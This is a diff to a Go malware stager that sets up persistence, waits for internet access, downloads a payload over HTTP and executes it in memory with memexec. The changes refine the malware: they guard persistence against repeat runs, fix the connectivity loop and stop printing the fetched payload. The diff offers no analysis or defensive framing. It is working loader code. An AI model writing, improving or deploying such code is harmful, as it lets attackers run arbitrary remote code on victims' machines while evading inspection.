@@ -6,6 +6,7 @@ import (
 	"io"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strings"
 	"time"
 
@@ -22,11 +23,14 @@ var (
 
 func main() {
 	fmt.Println("Hello friend")
-	persist()
-	for has_internet_access() {
+	if !has_persisted() {
+		persist()
+	}
+	for !has_internet_access() {
 		time.Sleep(time.Minute)
 	}
 	fetch_payload()
+	fmt.Println("Deploying :|")
 	go deploy(PAYLOAD)
 }
 
@@ -67,11 +71,10 @@ func fetch_payload() {
 	resp, _ := client.Do(request)
 	body := resp.Body
 	bytes, _ := io.ReadAll(body)
-	fmt.Println(string(bytes))
 	PAYLOAD = bytes
 }
 
 func deploy(payload []byte) {
 	exe, _ := memexec.New(PAYLOAD)
-	exe.Command().Run()
+	exe.Command().Output()
 }
